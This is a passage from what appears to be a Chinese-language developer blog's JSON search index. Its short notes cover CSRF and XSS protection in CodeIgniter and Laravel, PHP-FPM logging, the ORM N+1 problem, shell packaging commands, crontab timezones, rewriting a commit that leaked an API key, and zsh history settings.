OWASP/CheatSheetSeries](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md)\n\n### 圖片也要注意 XSS 攻擊\n\n```php\nif ($this->security->xss_clean($file, TRUE) === FALSE)\n{\n        // file failed the XSS test\n}\n```\n\n```php\n$this->input->get(xxx , TRUE );\n```\n\n## SSRF 安全過濾\n\n在寫 call curl API 需要安全行確認\n是不是參數是安全的\n例如\n\n```php\n<?php\nfunction callAPI($url){\n    ...\n    curl($url)\n}\n```\n\n上面 code 不能跑\n這就會有 SSRF 問題\n聽說 Server 端也能處理這個問題\n\n[CodeIgniter 的数据安全过滤全解析 - Just Code - ITeye 博客](https://justcoding.iteye.com/blog/546880)\n[深入探討 CodeIgniter Input Class 核心程式流程 | 小惡魔 - 電腦技術 - 工作筆記 - AppleBOY](https://blog.wu-boy.com/2011/08/%E6%B7%B1%E5%85%A5%E6%8E%A2%E8%A8%8E-codeigniter-input-class-%E6%A0%B8%E5%BF%83%E7%A8%8B%E5%BC%8F%E6%B5%81%E7%A8%8B/)\n","tags":["php"],"categories":["Codeigniter"]},{"title":"CSRF , SSRF , XSS 有關網頁安全小記","url":"%2Fblog%2F2019%2F05%2F26%2FCSRF-SSRF-XSS%E6%9C%89%E9%97%9C%E7%B6%B2%E9%A0%81%E5%AE%89%E5%85%A8%E5%B0%8F%E8%A8%98%2F","content":"\n最近看到相關網頁安全東西\nXSS,CSRF 我也比較長看到\n但是 SSRF 就沒什麼聽過\n筆記筆記\n\n<!--more-->\n\n找到資訊\n\n- [【庖丁解牛】CSRF 和 SSRF，是如何攻防？ - 知乎](https://zhuanlan.zhihu.com/p/28657325)\n- [XSS,CSRF,SSRF 三种漏洞的区别和共同点 - 18 年 3 月萌新白帽子 - CSDN 博客](https://blog.csdn.net/sdb5858874/article/details/80896784)\n- [csrf 以及 ssrf - 简书](https://www.jianshu.com/p/2f60dbd68eb8)\n- [SSRF 服务端请求伪造 - CTF Wiki](https://ctf-wiki.github.io/ctf-wiki/web/ssrf/)\n\n  傳接 API 需不需要加入 CSRF 判斷\n  所以查了一篇\n  好像也沒有一定答案\n  但有說串接 API 需要帶 Key\n\n- [请教大家 app 接口需要防护 csrf 吗？ · Ruby China](https://ruby-china.org/topics/32166)\n\n無相關小記\n\n- [WWDC 中提到的浏览器 Fingerprinting 有多可怕？ - 掘金](https://juejin.im/post/5b17de31f265da6e397b70f4)\n- [資料庫讀寫分離架構實踐 | 程式前沿](https://codertw.com/%E4%BC%BA%E6%9C%8D%E5%99%A8/165196/)\n\n有時間找到再補充\n\n**2019-07-01**\n\n最近用 CI 做 CSRF\n在頁面 form 和 ajax 做 CSRF\nPS: `$config['csrf_protection'] = TRUE;` 設定\n方法是用`data: {'<?php echo $this->security->get_csrf_token_name(); ?>':'<?php echo $this->security->get_csrf_hash(); ?>'`\n但在 SPA 做 CSRF 就會遇到 token 過期\n因為 CSRF token 只能用一次\n這個一不小心就踩到的問題\n\n[codeigniter 使用 CSRF Token 含 AJAX 驗證 – Bryce'S Note](http://blog.twbryce.com/codeigniter-%E4%BD%BF%E7%94%A8csrf-token/)\n網路找幾個方案\n\n1. Cookies 來抓 CSRF，因為 CSRF 是從 cookies 那邊設定\n\n```js\n$(function() {\n  $(\"#btn\").click(function() {\n    $.ajax({\n      type: \"POST\",\n      url: \"/ajax\", //ajax接收的server端\n      data:\n        $(\"#form\").serialize() +\n        \"&csrf_test_name=\" +\n        getCookie(\"csrf_test_name\"),\n      success: function(data) {\n        alert(data.msg);\n      },\n      dataType: \"json\"\n    });\n  });\n});\n\nfunction getCookie(name) {\n  var arr = document.cookie.match(new RegExp(\"(^| )\" + name + \"=([^;]*)(;|$)\"));\n  if (arr != null) return unescape(arr[2]);\n  return null;\n}\n```\n\n[Codeigniter 開啟 csrf protection 時 傳送表單(or ajax) | [lifeIs: tooShort to: waste]](https://blog.hsin.tw/2011/codeigniter-csrf-protection-form-ajax/)\n\n### Laravel AJAX 解法\n\n先說說一般用法\n`@csrf`\n\n1.\n\n```js\n$.ajaxSetup({\n  headers: { \"X-CSRF-TOKEN\": \"{{ csrf_token() }}\" }\n});\n```\n\n2.\n\n```html\n<meta name=\"_token\" content=\"{{ csrf_token() }}\" />\n```\n\n再用 js\n\n```\n$.ajaxSetup({\n   headers: {\n       'X-CSRF-TOKEN': $('meta[name=\"_token\"]').attr('content')\n   }\n});\n```\n\n3.  從 cookie 那邊得來 CSRF，跟上面 CI 方法很像，異曲同工之妙。\n\n```js\n$.ajaxSetup({\n  headers: {\n    \"X-XSRF-TOKEN\": $.cookie(\"XSRF-TOKEN\")\n  }\n});\n```\n\n我同事有找到一篇，先打 ajax 取 csrf，在發送表單...\n不過我們都覺得不優 XD\n\nPS: Laravel 會把 CSRF 寫在 XSRF-TOKEN\n\n[讓我們來談談 CSRF - Huli's blog](https://blog.huli.tw/2017/03/12/csrf-introduction/) {% asset_link web1.png 備份圖 %}\n[Laravel 中 Ajax 调用时的 CSRF 对策 – 目光博客](https://eyehere.net/2015/laravel-ajax-csrf/)\n[CSRF 保护 |《Laravel 5.5 中文文档》| Laravel China 社区](https://learnku.com/docs/laravel/5.5/csrf/1295)\n[codeigniter 使用 CSRF Token 含 AJAX 驗證 – Bryce'S Note](http://blog.twbryce.com/codeigniter-%E4%BD%BF%E7%94%A8csrf-token/)\n\n## AXIOS 搭配用 Laravel AJAX 免設定\n\n[axios/axios: Promise based HTTP client for the browser and node.js](https://github.com/axios/axios)\n\n```\n // `xsrfCookieName` is the name of the cookie to use as a value for xsrf token\nxsrfCookieName: 'XSRF-TOKEN', // default\n// `xsrfHeaderName` is the name of the http header that carries the xsrf token value\nxsrfHeaderName: 'X-XSRF-TOKEN', // default\n```\n\n設定 axios，可以不需要設定 CSRF\n前端套件幫你處理了 XD\n\n我覺得有空來實作看看\n\n**2019-07-05**\n\n今天看到\n\n- [IE 的一个通用 Cookie 跨域漏洞 - 知乎](https://zhuanlan.zhihu.com/p/31715835)\n- [讓我們來談談 CSRF · Issue #16 · aszx87410/blog](https://github.com/aszx87410/blog/issues/16)\n- [twtrubiks/CSRF-tutorial: Use Django To Introduce CSRF and Cookies , Session 📝](https://github.com/twtrubiks/CSRF-tutorial)\n\n講到\n\n- Synchronizer Token Pattern ( STP )\n- Double Submit Cookie\n\n> 其中的\"某些 CSRF 防禦\"特指 Double Cookie Submit。（雙 Cookie 遞交認證，指的是在 GET 參數及 HTTP 請求中同時包含一個隨機的字符串，如果服務器判斷 GET 參數和 Cookie 參數相等，那麼沒有受到 CSRF 攻擊）由於這是 OWASP 欽定的防禦方法，人們往往會忽略 IE Cookie 漏洞對其的繞過。\n> [IE 的一個通用 Cookie 跨域漏洞 - 知乎](https://zhuanlan.zhihu.com/p/31715835)\n\n這個寫得很清楚是什麼意思\n\n我覺寫得不錯!!\n","tags":["XSS"],"categories":["程式心法"]},{"title":"PHP-FPM 打開 error log 方法","url":"%2Fblog%2F2019%2F05%2F22%2FPHP-FPM-%E6%89%93%E9%96%8B-error-log-%E6%96%B9%E6%B3%95%2F","content":"\n最近用 docker 使用 portainer 看 log\n卻沒有看到我想要的程式錯誤資訊\n查了一下 PHP-FPM 預設沒有打開\n\n<!--more-->\n\n** 2019-06-03 **\n\n這篇 php-fpm 雖然不會記入 log\n假如有用 docker 執行的話\n可以在 docker 下看 log\n不用調整 php-fpm\n用 docker 的人可能不需要調整\n\n可詳細\n[PHP CI 框架不會記錄 ERROR 到 nginx log 裡解決方案 | 程式狂想筆記](/blog/2019/06/03/PHP-CI-%E6%A1%86%E6%9E%B6%E4%B8%8D%E6%9C%83%E8%A8%98%E9%8C%84-ERROR-%E5%88%B0-nginx-log%E8%A3%A1%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%A1%88/)\n\n## PHP-FPM 調整設定\n\n/usr/local/etc/php-fpm.d/www.conf\n\n> 找到 catch_workers_output 設定，改為 yes\n> ; Redirect worker stdout and stderr into main error log. If not set, stdout and\n> ; stderr will be redirected to /dev/null according to FastCGI specs.\n> ; Default Value: no\n> catch_workers_output = yes\n\n[XYZ 的筆記本: PHP FPM 錯誤記錄不會寫到 error log ?](https://xyz.cinc.biz/2016/07/php-fpm-error-log.html)\n\n> 1. 修改 php-fpm.conf 文件，添加（或修改）如下配置：\n>\n> [global]\n> error_log = log/error_log <-- 這個我沒設定，只設定 catch_workers_output = yes\n>\n> [www]\n> catch_workers_output = yes\n>\n> 2.  修改 php.ini 文件，添加（或修改）如下配置：\n>\n> log_errors = On\n> error_log = \"/usr/local/lnmp/php/var/log/error_log\"\n> error_reporting=E_ALL&~E_NOTICE\n>\n> 3.  重启 php-fpm\n\n參考來源:\n[开启 php-fpm 错误日志](https://gist.github.com/BiosSun/7244141)\n\n## 設定 PHP Log 小方法\n\n在用 docker PHP-FPM 路徑在/usr/local/etc/php-fpm.d/www.conf\n因為我 docker 沒安裝 vi, nano\n所以我想用 `sed` 修改檔案\n\n> 這時候要把這個文件的 phobia 通通改成 phobe：\n>\n>     sed -i -e 's/phobia/phobe/' phobia.txt\n>     sed -i -e 's/phobia/phobe/g' phobia.txt\n>     sed -i .bak -e 's/phobia/phobe/g' phobia.txt\n>\n> 注意-i 代表 Edit file in-place，也就是直接編輯檔案的意思\n>\n> 第 2 個指令多了一個 g, 代表同一行裡面如果出現多次則通通修改；第 1 個指令只會改掉每一行裡面第一個遇到的 pattern。在 Mac 裡面-i 的行為跟在 Linux 下會不一樣，像是第 3 行的\n> 指令在 Linux 下就只會直接編輯檔案；但在 Mac 下卻會被備份一個檔案後面接著-e\n>\n> 第 3 行指令裡面的-i 後面接.bak 意思為，把原始的檔案多加.bak 存成備份。\n> [阿就操場啊~: sed 直接編輯文件，做文字取代](https://2formosa.blogspot.com/2018/03/sed-edit-a-file-directly.html)\n\n所以簡單使用\n\n```bash\nsed -i 's/;catch_workers_output = yes/catch_workers_output = yes/g' www.conf\n```\n\n相關連結\n[Sed 的常用命令语法备忘【转】 | Henter](https://henter.me/post/sed-notes.html)\n","tags":["php-fpm"],"categories":["PHP"]},{"title":"有關程式 N+1 問題","url":"%2Fblog%2F2019%2F05%2F21%2F%E6%9C%89%E9%97%9C%E7%A8%8B%E5%BC%8F-N-1-%E5%95%8F%E9%A1%8C%2F","content":"\n最近在做複雜的 API\n由於 PM 覺得某一個 JSON 屬性調整\n結果需要改好幾隻程式 API\n不過有查到可以使用[GraphQL | 一种为你的 API 而生的查询语言](https://graphql.cn/)\n但這篇不是重點在 GraphQL\n而是我探索某一篇 [阻碍你使用 GraphQL 的十个问题 | 咀嚼之味](https://jerryzou.com/posts/10-questions-about-graphql/)\n\n> 它就像是一顆無限向下延伸的樹。所以在我看來，GraphQL 更應該叫 TreeQL，當然在圖論裡，Tree 就是 Graph 也沒毛病啦。需要注意的是，這也會引出 「N + 1 problem」 的話題——naive 的 GraphQL 服務端實現會讓這段 query 變得異常慢！\n\n看了一下內容，N+1 問題就有像一個查詢每一行執行 SQL\n如下\n\n```sql\nSELECT * FROM `song` LIMIT 0, 20;\nSELECT * FROM `singer` WHERE `id` = 1;\nSELECT * FROM `singer` WHERE `id` = 2;\nSELECT * FROM `singer` WHERE `id` = 3;\n...\n```\n\n奇怪，這個怎麼讓我想到 ORM 也是這樣\n所以我查了一下 ORM 真的也有這個問題\n由於最近也想開使用 ORM ，所以進入前想了解之後使用上會遇到什麼問題\n這邊只會先整理\n\n<!--more-->\n\n## DataLoader\n\n目前查到資料可以用 `DataLoader` 方式解決問題\n\n> Dataloader 主要有兩項功能： Batching (批次) & Caching (快取) 。\n> Batching 在於他能夠將想要進 db 搜尋的 id 都搜集起來，等時間到了一次進 db 搜尋，解決 N + 1 問題。\n> Caching 在於它在紀錄 id 時會做 memoization ，所以未來若是有重複的 id 進來就會被剔除，保證資料索取數越少越好。\n\n[GraphQL Design: 使用 DataLoader 提升效能 ! - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/articles/10207606)\n\n有爬到這篇有 10000 一筆一筆方式撈出來\n得到\n[用範例程式實際探索 N + 1 query 有多可怕 – Yulin Chen – Medium](https://medium.com/@festime/%E7%94%A8%E7%AF%84%E4%BE%8B%E7%A8%8B%E5%BC%8F%E5%AF%A6%E9%9A%9B%E6%8E%A2%E7%B4%A2-n-1-query-%E6%9C%89%E5%A4%9A%E5%8F%AF%E6%80%95-b89e7735ea81)\n\n## Laravel ORM 解決\n\n> Laravel 中解決 N + 1 問題\n> 使用預加載功能\n> 使用 with() 方法，會做緩存\n> with() 中放需要查詢的關聯屬性\n> [總結要點：使用 Laravel 開發工具，ORM 查詢的 N + 1 問題 | Laravel China 社區 - 高品質的 Laravel 開發者社區](https://learnku.com/laravel/t/7778/summary-using-the-laravel-development-tool-the-n-1-problem-of-the-orm-query)\n\n## 我自己想到的方法\n\n由於 sharding 不能做 join 動作，所以我使用`where in (id list)`方式查詢\n但這種方法程式一寫差錯，可能程式就`500`了\n\n其中有一篇 Eager Loading，Laravel 的 `with` 跟這個有關係\n\n- [ORM 中的 N+1 问题 - google4y - 博客园](https://www.cnblogs.com/google4y/p/3455534.html)\n- [◉ Performance: N+1 Query Problem](https://secure.phabricator.com/book/phabcontrib/article/n_plus_one/)\n- [GraphQL N+1 问题解决方案 | HHF 金字塔](http://www.haohongfan.com/2018/11/graphql-n-1-%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/)\n- [[Rails] N+1 Queries Problem – Dosmanthus – Medium](https://medium.com/@dd0425/rails-n-1-queries-problem-73dfe5f99182)\n- [Eloquent: Relationships - Laravel - The PHP Framework For Web Artisans](https://laravel.com/docs/5.8/eloquent-relationships#eager-loading)\n- [数据库:django ORM 如何处理 N+1 查询 - 答复哈 - OSCHINA](https://my.oschina.net/oncereply/blog/268922)\n- [Laravel N+1 Problem @ Neil的部落格 :: 痞客邦 ::](http://nsps5203.pixnet.net/blog/post/277235432-laravel-n%2B1-problem)\n\n### 相關連結\n\n- [Laravel 使用二级缓存提高缓存命中率和内存使用效率 - 探花的 Blog](http://vanry.me/laravel/secod-level-cache.html)\n- [Laravel 在 with 查询中只查询个别字段 | Laravel China 社区 - 高品质的 Laravel 开发者社区](https://learnku.com/laravel/t/1220/laravel-queries-only-individual-fields-in-with-queries)\n- [[擴展推薦] Laravel Query Detector 數據模型查詢的 N+1 問題捕殺神器 | Laravel China 社區 - 高品質的 Laravel 開發者社區](https://learnku.com/laravel/t/14691/extended-recommendation-n1-question-capture-artifact-for-laravel-query-detector-data-model-query)\n- [在 Laravel 中使用 GraphQL 一【获取数据】 | Laravel China 社区 - 高品质的 Laravel 开发者社区](https://learnku.com/articles/8115/using-graphql-one-in-laravel-get-data)\n- [阻礙你使用 GraphQL 的十個問題 | 咀嚼之味](https://jerryzou.com/posts/10-questions-about-graphql/)\n\n## 其他小記\n\n### GraphQL 小記\n\n- [TypeORM - 最好的 Node.js ORM 框架 - CNode 技术社区](https://cnodejs.org/topic/5ac073b852d7d3a8698a49f4)\n- [GraphQL 教程（六）—— N+1 问题和缓存等问题 | 豪翔天下](https://haofly.net/graphql-tutorial-6/)\n- [Using DataLoader with GraphQL: A Concrete Example – codeburst](https://codeburst.io/using-dataloader-with-graphql-a-concrete-example-9b21352f1676)\n- [在 Laravel 中使用 GraphQL 一【获取数据】 | Laravel China 社区 - 高品质的 Laravel 开发者社区](https://learnku.com/articles/8115/using-graphql-one-in-laravel-get-data)\n- [GraphQL Design: 使用 DataLoader 提升效能 ! - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/articles/10207606)\n- [阻碍你使用 GraphQL 的十个问题 | 咀嚼之味](https://jerryzou.com/posts/10-questions-about-graphql/)\n- [GraphQL 入門： 簡介 \bX 範例 X 優缺點 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/articles/10200678)\n- [2018 GraphQL 漸進式導入的架構 – Michael Hsu – Medium](https://medium.com/@evenchange4/2018-graphql-%E6%BC%B8%E9%80%B2%E5%BC%8F%E5%B0%8E%E5%85%A5%E7%9A%84%E6%9E%B6%E6%A7%8B-aeb2603f2223)\n\n### sharding 小記\n\n> 當下還沒有非常令人滿意的基於 hibernate 的 sharding 框架，（關於 hibernate hards 會在下文介紹），因此很多團隊會選擇自行實現 sharding。\n\n原文網址：https://read01.com/AJO2Bm.html\n\n[Spring 的 DAO 支持](https://openhome.cc/Gossip/SpringGossip/SpringDAO.html)\n\n### ftp 小記\n\n因為最近沒時間整理\n所以先暫時貼在這\n目前可能組`put xxx`的 ftp 指令內容\n最後在`sftp < xxx.txt`會比較快\n\n- [List all files in a ftp folder in a text file [ bash ls ]](https://gist.github.com/timendum/1109055)\n- [How to upload (FTP) files to server in a bash script? - Stack Overflow](https://stackoverflow.com/questions/1894347/how-to-upload-ftp-files-to-server-in-a-bash-script/1894479)\n- [bash - Get notified about new files on SFTP server - Ask Ubuntu](https://askubuntu.com/questions/576927/get-notified-about-new-files-on-sftp-server)\n- [用二句 Shell 命令实现 FTP 批量上传文件夹 - linux48](http://linux48.com/2014-11-11-shell-ftp-uplod.html)\n- [Upload files from a list via ftp in bash - Stack Overflow](https://stackoverflow.com/questions/44019171/upload-files-from-a-list-via-ftp-in-bash)\n","tags":["orm"],"categories":["程式心法"]},{"title":"SQL union 排序的問題","url":"%2Fblog%2F2019%2F05%2F20%2FSQL-union-%E6%8E%92%E5%BA%8F%E7%9A%84%E5%95%8F%E9%A1%8C%2F","content":"\nunion 要做排序要放在最下面\n\nselect seq from ooo\nunion\nselect null as seq from xxx\n\nseq 全部都會變成 null\n\n最近太忙了\n先記錄到這邊\n有空在研究\n[UNION 中 ORDER By 的使用 - 不要依赖这里 因为你有大脑 - ITeye 博客](https://wuaner.iteye.com/blog/559781)\n","tags":["union"],"categories":["SQL"]},{"title":"另類快速打包commmit程式方法","url":"%2Fblog%2F2019%2F05%2F20%2F%E5%8F%A6%E9%A1%9E%E5%BF%AB%E9%80%9F%E6%89%93%E5%8C%85commmit%E7%A8%8B%E5%BC%8F%E6%96%B9%E6%B3%95%2F","content":"\n[快速打包程式的腳本(shell) | 程式狂想筆記](https://malagege.github.io/blog/2019/01/05/%E5%BF%AB%E9%80%9F%E6%89%93%E5%8C%85%E7%A8%8B%E5%BC%8F%E7%9A%84%E8%85%B3%E6%9C%AC-shell/)\n之前有寫過這篇，再包程式都是固定的程式\n有時候公司需要打包只有異動到的檔案\n這時候之前寫的程式內容可以修正\n但我在想有什麼快速整理\n\n<!--more-->\n\n## 使用 GIT 抓取異動檔案\n\n`git diff --stat`\n會顯示異動檔案，當然也會有後面的異動行數\n\n```bash\ngit diff head^ --name-only\n```\n\n可抓上次異動的檔案\n\n這時候可以貼到[快速打包程式的腳本(shell) | 程式狂想筆記](https://malagege.github.io/blog/2019/01/05/%E5%BF%AB%E9%80%9F%E6%89%93%E5%8C%85%E7%A8%8B%E5%BC%8F%E7%9A%84%E8%85%B3%E6%9C%AC-shell/)之前的 code\n\n## cp 複製檔案\n\n假如複製少許檔案\n使用 git diff 抓取少許檔案\n為了貼一個檔案，就用腳本工具也挺麻煩\n可以直接使用`cp`指令\n\n在[bash - Linux: copy and create destination dir if it does not exist - Stack Overflow](https://stackoverflow.com/a/8722721)有提到用`--parents`可以解決問題\n\n```bash\n/tmp $ mkdir foo\n/tmp $ mkdir foo/foo\n/tmp $ touch foo/foo/foo.txt\n/tmp $ mkdir bar\n/tmp $ cp --parents foo/foo/foo.txt bar\n/tmp $ ls bar/foo/foo\nfoo.txt\n```\n\n複製檔案範例\n\n```\ncp --parents foo/foo/foo.txt(打包檔案) ~/(打包路徑)\n#ex\ncp --parent ooo/xxx.php ~/Desktop\n```\n\n用 Sublime Text 快速貼上也很快 XD\n\n### cp 另類複製方法\n\n但有看到 Mac 不能用`--parents`\n有看到一種方法\n\n```bash\nmkdir -p /foo/bar && cp myfile.txt $_\n```\n\n![參考網址](https://stackoverflow.com/a/32596855)\n\n查了一下，`$_`這個參數很特別\n是抓取前一個指令最後面一個參數\n\n```bash\ngit\necho $_\n# git\nll\necho $)\n#-l  (抓取上一個指令最後一個參數，若沒參數就是指令)\n```\n\n所以\\$\\_可以做這樣運用\n\n[Bash shell script 教學](https://www.slideshare.net/misscoming/bash-shell-script)\n[bash-shell-script-10-638.jpg（JPEG 圖片，638x479 像素）](https://image.slidesharecdn.com/bashshellscript-150218092059-conversion-gate01/95/bash-shell-script-10-638.jpg?cb=1424287937)\n\n## 7z 快速壓縮打包\n\n2019-05-22\n用 CP 指令打包，還需要手動作壓縮\n今天有找到一個方法\n設定 `file.txt` 可完成快入打包\nfile.txt\n\n```\nxxx/ooo.jpg\nxxx/ooo.jpg\nxxx/ooo.jpg\n```\n\n```bash\nnow=`date +\"%Y%m%d_%H%M\"`\n7z a  DestinyTest_$now.7z @file.txt\n```\n\n真的非常方便\n\n相關連結\n\n- [bash - How do I zip up multiple files on command line? - Ask Ubuntu](https://askubuntu.com/questions/777049/how-do-i-zip-up-multiple-files-on-command-line)\n- [7 zip - How to pass multiple files to zip in a single command using 7 zip? - Super User](https://superuser.com/questions/940878/how-to-pass-multiple-files-to-zip-in-a-single-command-using-7-zip)\n- [Linux 日期格式 - Shell Script 自訂格式](https://www.opencli.com/linux/linux-date-format-shell-script)\n- [terminal - create zip based on contents of a file list - Server Fault](https://serverfault.com/questions/652892/create-zip-based-on-contents-of-a-file-list)\n- [Can't using vim editor on console connection with container. · Issue #322 · portainer/portainer](https://github.com/portainer/portainer/issues/322)\n","tags":["shell"],"categories":["shell"]},{"title":"Android在Chrome做Debug封包方法","url":"%2Fblog%2F2019%2F05%2F20%2FAndroid%E5%9C%A8Chrome%E5%81%9ADebug%E5%B0%81%E5%8C%85%E6%96%B9%E6%B3%95%2F","content":"\n之前只會用 Fiddler 做 Android Debug 工具\n但當沒有同網段網域的時候，就不會很方便處理問題\n前陣子有人推薦用 Android Studio 工具\n裡面的 Network 可以看[Inspect network traffic with Network Profiler | Android Developers](https://developer.android.com/studio/profile/network-profiler)\n但感覺...殺雞焉用牛刀\n最近聽到 Chrome 插 USB 也能用 Debug!!!\n\n<!--more-->\n\n[遠程調試 Android 設備使用入門 | Tools for Web Developers | Google Developers](https://developers.google.com/web/tools/chrome-devtools/remote-debugging/?hl=zh-tw)\n\n[星塵 AskeinG: [分享] 透過 DevTools 在 Android Chrome 除錯](http://askeing.blogspot.com/2016/04/devtools-android-chrome.html)\n\n只能說 666，有時間再來筆記\n最近太忙 orz\n\n**2019-06-25**\n發現新工具，有時間再來試試\n[mitmproxy - an interactive HTTPS proxy](https://mitmproxy.org/)\n[如何使用 mitmproxy 來監看手機上的 apps 連線到哪些網站 | 隨便寫寫](https://louie023.wordpress.com/2014/09/27/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8-mitmproxy-%E4%BE%86%E7%9B%A3%E7%9C%8B%E6%89%8B%E6%A9%9F%E4%B8%8A%E7%9A%84-apps-%E9%80%A3%E7%B7%9A%E5%88%B0%E5%93%AA%E4%BA%9B%E7%B6%B2%E7%AB%99/)\n","tags":["chrome"],"categories":["實用工具"]},{"title":"設定crontab排程時區小記","url":"%2Fblog%2F2019%2F05%2F16%2F%E8%A8%AD%E5%AE%9Acrontab%E6%8E%92%E7%A8%8B%E6%99%82%E5%8D%80%E5%B0%8F%E8%A8%98%2F","content":"\n最近因為要設定 crontab 時區\n但主機時區不是台灣時間\n但程式是台灣時間\n但這時候控制排程可能就會有時間差的問題\n\n<!--more-->\n\n## 在 Linux 設定 方法\n\n其實這時候很簡單，調整時區就能解決問題!!\n\nCrontab 能不能調整時區?\n答案可以：\n[CentOS7 下 Crontab 时区问题 | MYF](https://menyifan.com/2016/11/08/crontab_timezone/)\n\n> ntpdate -u tock.stdtime.gov.tw\n> timedatectl set-timezone Asia/Taipei\n> timedatectl set-local-rtc 0 # Set Real-Time Clock\n> cp -pf /usr/share/zoneinfo/Asia/Taipei /etc/localtime\n\n其他相關\n[Linux 設定 NTP 同步系統時間，自動網路校時教學 - G. T. Wang](https://blog.gtwang.org/linux/linux-ntp-installation-and-configuration-tutorial/)\n[使用 ntpd 來替換 ntpdate 以完成校時的工作 – SZ Lin & Embedded Linux](https://szlin.me/2016/07/19/%E4%BD%BF%E7%94%A8-ntpd-%E4%BE%86%E6%9B%BF%E6%8F%9B-ntpdate-%E4%BB%A5%E5%AE%8C%E6%88%90%E6%A0%A1%E6%99%82%E7%9A%84%E5%B7%A5%E4%BD%9C/)\n\n可惜！目前專案不太希望我們動到主機時區 orz\n\n## 設定 bash 環境變數\n\n> TZ='Asia/Taipei'; export TZ\n\n[crontab 时区以及 linux 时区设置-luosiyong](http://luosiyong.lofter.com/post/1cc7f64b_6cc5cfc)\n\n這可以改變 Bash 變時區問題\n但是 Crontab 還是不會有影響\n[定时任务 cron 时区的问题](https://busy.org/@oflyhigh/cron#comments) {% asset_link 1.png 備份圖 %}\n\n`/etc/init.d/cron`但這邊設定檔好像可以設定\n\n**PS:還沒有驗證**\n\n[6 Online Tools for Generating and Testing Cron Jobs for Linux](https://www.tecmint.com/online-cron-job-generator-and-tester-for-linux/)\n\n其實，PHP CI 的 index.php 連線都有設定台灣時區，DB 連線也有設定\n但之後程式可能需要有程式設定 crontab\n目前有想到用程式減少相對時區\n解決問題\n\n小記 Laravel 設定時區[PHPer: Laravel 5 資料庫 timezone 設定](http://phpwrite.blogspot.com/2015/08/laravel-5-timezone.html)\n\n```\n'mysql' => [\n    ...\n    'options' => [\n        PDO::MYSQL_ATTR_INIT_COMMAND => 'SET time_zone = \"+08:00\"'\n    ],\n    (or)\n    'timezone' => '+08:00',\n],\n```\n\n[Set default MySQL timezone on connect? | Laravel.io](https://laravel.io/forum/10-16-2015-set-default-mysql-timezone-on-connect)\n[cron - How do you set the timezone for crontab? - Ask Ubuntu](https://askubuntu.com/questions/54364/how-do-you-set-the-timezone-for-crontab)\n"},{"title":"Discord apikey exposed on GitHub不小心上傳api key","url":"%2Fblog%2F2019%2F05%2F12%2FDiscord-apikey-exposed-on-GitHub%E4%B8%8D%E5%B0%8F%E5%BF%83%E4%B8%8A%E5%82%B3api-key%2F","content":"\n今天 git push 前幾天寫的 blog 內容\n收到`Discord apikey exposed on GitHub`\n看了一下信，好像我上傳 apikey 到 github 上面\n\n<!--more-->\n\n{% asset_img 1.png 收信的內容 %}\n\n> GitGuardian detected an API key from Discord in the following commit from \\*\\*\\*\\* pushed at 2019-05-11T17:52:24Z.\n> GitGuardian, or \"GG\", is a \"Good Guy\" bot scanning in real time GitHub commits for sensitive information.\n> Once you have pushed sensitive information to GitHub, this information is public and should be considered compromised. We just open sourced our GitHub repository to help developers take appropriate actions. Would love a star! :)\n> Accidents happened to the best of us and will continue to happen. Sign up to our service to be notified if this happens again. We got a free tier for individual developers !\n\n看了一下，我還真的把 discord api key 傳上去\n這時候我就用 git rebase 環原去修正裡面內容\n\n先去.deploy_git 裡面下`git rebase -i xxxx^`\n要修正的 commit 請記得改`edit`再`:wq`\n**修改完內容記得用`git rebase --continue`**\n不是下`git commit`!!!!\n\n[Git-Tutorials/README.md at master · twtrubiks/Git-Tutorials · GitHub](https://github.com/twtrubiks/Git-Tutorials/blob/master/README.md)\n平常沒什麼機會用到\n今天碰到了 XD\n\n不過 hexo deploy 的網頁檔沒有抓到\n他是抓到我上傳 markdown 檔案\n看來不會對大檔案做簡查\n ","categories":["寫程式一些事"]},{"title":"Zsh設定開啟commmand紀錄","url":"%2Fblog%2F2019%2F05%2F12%2FZsh%E8%A8%AD%E5%AE%9A%E9%96%8B%E5%95%9Fcommmand%E7%B4%80%E9%8C%84%2F","content":"\n最近重裝 zsh\n就發現沒有 history 查詢功能(往上)\n只要登出，就沒有這個很不方便\n今天特別 google 一下\n\n<!--more-->\n\n只要在`~/.zshrc`最上面加\n\n```\nHISTSIZE=1000\nSAVEHIST=1000\nHISTFILE=~/.history\n```\n\n存檔就可以完成設定\n\n參考:\n[A User's Guide to the Z-Shell](http://zsh.sourceforge.net/Guide/zshguide02.html)\n[Command history in Zsh - Unix & Linux Stack Exchange](https://unix.stackexchange.com/questions/111718/command-history-in-zsh)\n","tags":["zsh"],"categories":["實用工具"]},{"title":"開啟大檔案的好用工具PilotEditLite","url":"%2Fblog%2F2019%2F05%2F11%2F%E9%96%8B%E5%95%9F%E5%A4%A7%E6%AA%94%E6%A1%88%E7%9A%84%E5%A5%BD%E7%94%A8%E5%B7%A5%E5%85%B7PilotEditLite%2F","content":"\n最近要匯入大量 sql\n檔案有大到超過 3G\nSublime,vscode 都不適合開大檔案\n所以網路爬了工具\n記錄一下\n\n<!--more-->\n\n## PilotEdit\n\nPilotEdit 有免費的!!但超過 400GB 就需要錢了(我有生之年會遇到??)\n[PilotEdit Lite 12.6.0 中文版 - 支援超大檔案的文字編輯軟體 - 阿榮福利味 - 免費軟體下載](https://www.azofreeware.com/2015/06/pilotedit.html)\n\n不過預設開啟檔案不是 UTF8\n可能需要調整一下\n`編輯`→`改變檔編碼`\n可調整編碼\n\n{% asset_img 1.png 調整編碼 %}\n\n第二個選項一定要勾，第一個選項看你之後開的檔案編碼是不是一樣\n假如是的話可以打勾\n\n## 其他工具\n\nEmEditor 要錢!!不是免費的\n[EmEditor (文字編輯器) – 支持大檔案以及 Unicode 的最佳 Windows 編輯器!](https://zh-tw.emeditor.com/)\n\n[windows 下如何查看超大文本文件(5G ) - 知乎](https://www.zhihu.com/question/19688121/answer/63245703)\n裡面有提到\n\n1. WINHEX\n2. glogg\n\nglogg 